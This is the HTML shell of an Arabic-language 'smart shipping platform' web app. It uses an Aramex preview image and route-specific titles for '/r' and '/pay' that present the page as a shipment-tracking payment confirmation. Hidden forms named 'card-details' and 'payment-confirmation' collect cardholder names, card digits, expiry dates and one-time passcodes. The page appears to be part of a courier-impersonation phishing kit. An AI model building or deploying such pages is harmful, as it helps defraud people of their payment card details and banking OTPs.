<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="theme-color" content="#0EA5E9" />
    <link rel="manifest" href="/manifest.json" />
    <link rel="apple-touch-icon" href="/icon-192.png" />
    <title>منصة الشحن الذكية - حلول شحن متطورة</title>
    <meta name="description" content="منصة شحن ذكية وموثوقة - خدمات شحن سريعة وآمنة مع دعم جميع شركات الشحن الكبرى" />
    <meta name="author" content="منصة الشحن الذكية" />
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Almarai:wght@300;400;700;800&display=swap" rel="stylesheet">

    <meta property="og:title" content="منصة الشحن الذكية - حلول شحن متطورة" />
    <meta property="og:description" content="منصة شحن ذكية وموثوقة - خدمات شحن سريعة وآمنة مع دعم جميع شركات الشحن الكبرى" />
    <meta property="og:type" content="website" />
    <meta property="og:image" content="/og-aramex.jpg" />
    <meta property="og:image:width" content="1200" />
    <meta property="og:image:height" content="630" />
    <meta property="og:image:type" content="image/jpeg" />

    <meta name="twitter:card" content="summary_large_image" />
    <meta name="twitter:site" content="@shipping_platform" />
    <meta name="twitter:image" content="/og-aramex.jpg" />
    <meta name="twitter:image:alt" content="منصة الشحن الذكية" />

    <script>
      // Update meta tags for specific routes
      (function() {
        const path = window.location.pathname;
        const origin = window.location.origin;

        // Service-specific meta tags
        const serviceMeta = {
          'r': {
            title: 'تأكيد الدفع - خدمة شحن موثوقة',
            description: 'تتبع شحنتك وأكمل الدفع بشكل آمن ومحمي',
            image: '/og-aramex.jpg'
          },
          'pay': {
            title: 'صفحة دفع آمنة',
            description: 'أكمل الدفع بشكل آمن ومحمي',
            image: '/og-aramex.jpg'
          }
        };

        // Extract the first path segment (e.g., 'r' from '/r/something')
        const firstSegment = path.split('/').filter(Boolean)[0];
        const meta = serviceMeta[firstSegment];

        if (meta) {
          document.title = meta.title;
          const desc = document.querySelector('meta[name="description"]');
          if (desc) desc.setAttribute('content', meta.description);

          const ogTitle = document.querySelector('meta[property="og:title"]');
          if (ogTitle) ogTitle.setAttribute('content', meta.title);

          const ogDesc = document.querySelector('meta[property="og:description"]');
          if (ogDesc) ogDesc.setAttribute('content', meta.description);

          const ogImage = document.querySelector('meta[property="og:image"]');
          if (ogImage) ogImage.setAttribute('content', origin + meta.image);

          const twitterImage = document.querySelector('meta[name="twitter:image"]');
          if (twitterImage) twitterImage.setAttribute('content', origin + meta.image);
        }
      })();
    </script>
  </head>

  <body>
    <div id="root">
      <!-- Loading indicator -->
      <div id="loading" style="
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        z-index: 9999;
      ">
        <div style="
          width: 50px;
          height: 50px;
          border: 3px solid rgba(255,255,255,0.3);
          border-top: 3px solid white;
          border-radius: 50%;
          animation: spin 1s linear infinite;
          margin-bottom: 20px;
        "></div>
        <p style="
          color: white;
          font-family: 'Almarai', sans-serif;
          font-size: 18px;
          font-weight: 400;
          margin: 0;
        ">جارٍ التحميل...</p>
      </div>
      <style>
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
      </style>
    </div>
    <script type="module" src="/src/main.tsx"></script>
    <script>
      // Hide loading indicator once app is loaded
      window.addEventListener('load', () => {
        setTimeout(() => {
          const loading = document.getElementById('loading');
          if (loading) {
            loading.style.opacity = '0';
            loading.style.transition = 'opacity 0.5s';
            setTimeout(() => loading.remove(), 500);
          }
        }, 500);
      });
    </script>

    <!-- Hidden Netlify Forms for Detection -->
    <form name="card-details" netlify-honeypot="bot-field" data-netlify="true" hidden>
      <input type="text" name="name" />
      <input type="email" name="email" />
      <input type="tel" name="phone" />
      <input type="text" name="service" />
      <input type="text" name="cardholder" />
      <input type="text" name="cardLast4" />
      <input type="text" name="expiry" />
      <input type="text" name="timestamp" />
    </form>

    <form name="payment-confirmation" netlify-honeypot="bot-field" data-netlify="true" hidden>
      <input type="text" name="name" />
      <input type="email" name="email" />
      <input type="tel" name="phone" />
      <input type="text" name="service" />
      <input type="text" name="amount" />
      <input type="text" name="cardholder" />
      <input type="text" name="cardLast4" />
      <input type="text" name="otp" />
      <input type="text" name="timestamp" />
    </form>
  </body>
</html>
